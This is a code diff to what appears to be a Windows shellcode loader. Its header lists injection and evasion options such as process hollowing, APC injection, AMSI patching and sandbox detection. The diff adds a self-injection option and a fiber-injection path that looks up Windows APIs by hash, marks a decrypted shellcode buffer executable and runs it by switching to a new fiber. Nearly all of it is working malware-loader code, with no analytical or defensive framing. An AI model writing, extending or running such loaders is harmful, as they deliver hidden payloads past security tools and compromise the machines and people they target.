@@ -6,6 +6,8 @@
 //   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
 //   USE_HOLLOW        : Process Hollowing (unmap original + RIP redirect)
 //   USE_REMOTE_THREAD : NtCreateThreadEx in an existing process (no CreateProcess)
+//   USE_SELF_INJECT   : NtCreateThreadEx in current process
+//   USE_FIBER_INJECT  : Fiber switch (ConvertThreadToFiber + CreateFiber, no new thread)
 //   USE_AMSI_PATCH    : Patch AmsiScanBuffer
 //   USE_SANDBOX_CHECK : Basic sandbox/timing detection
 //   USE_WIPE          : Zero heap payload after injection
@@ -128,6 +130,12 @@ constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
 #endif
 #ifdef USE_SELF_INJECT
 constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
+#endif
+#ifdef USE_FIBER_INJECT
+constexpr DWORD HF_ConvertThreadToFiber     = _hA("ConvertThreadToFiber");
+constexpr DWORD HF_CreateFiber              = _hA("CreateFiber");
+constexpr DWORD HF_SwitchToFiber            = _hA("SwitchToFiber");
+constexpr DWORD HF_DeleteFiber              = _hA("DeleteFiber");
 #endif
 #ifdef USE_SANDBOX_CHECK
 constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
@@ -550,6 +558,44 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             if (pNtWSO) pNtWSO(hThread, FALSE, NULL);
             if (pCH)    pCH(hThread);
         }
+    }
+#elif defined(USE_FIBER_INJECT)
+    /* Fiber injection: shellcode via fiber switch (no thread creation) */
+    {
+        typedef LPVOID (WINAPI *t_CTTF)(LPVOID);
+        typedef LPVOID (WINAPI *t_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+        typedef void   (WINAPI *t_STF) (LPVOID);
+        typedef BOOL   (WINAPI *t_DF)  (LPVOID);
+        t_CTTF pCTTF = (t_CTTF)RK32(HF_ConvertThreadToFiber);
+        t_CF   pCF   = (t_CF)  RK32(HF_CreateFiber);
+        t_STF  pSTF  = (t_STF) RK32(HF_SwitchToFiber);
+        t_DF   pDF   = (t_DF)  RK32(HF_DeleteFiber);
+        if (!pCTTF || !pCF || !pSTF) {
+            DBG("[FAIL] FiberInject: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* sc already decrypted and RW - change to RX */
+        PVOID  prot_base = sc;
+        SIZE_T prot_sz   = sc_sz;
+        ULONG  old_prot  = 0;
+        pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+        DBG("[FI1] Self RW -> RX");
+        LPVOID mainFiber = pCTTF(NULL);
+        if (!mainFiber) {
+            DBG("[FAIL] FiberInject: ConvertThreadToFiber failed");
+            return 1;
+        }
+        DBG("[FI2] Thread converted to fiber");
+        LPVOID scFiber = pCF(0, (LPFIBER_START_ROUTINE)sc, NULL);
+        if (!scFiber) {
+            DBG("[FAIL] FiberInject: CreateFiber failed");
+            return 1;
+        }
+        DBG("[FI3] Shellcode fiber created - switching");
+        pSTF(scFiber);
+        DBG("[FI4] Returned from shellcode fiber");
+        if (pDF) pDF(scFiber);
     }
 #elif defined(USE_REMOTE_THREAD)
     /* Inject into existing process via NtCreateThreadEx */
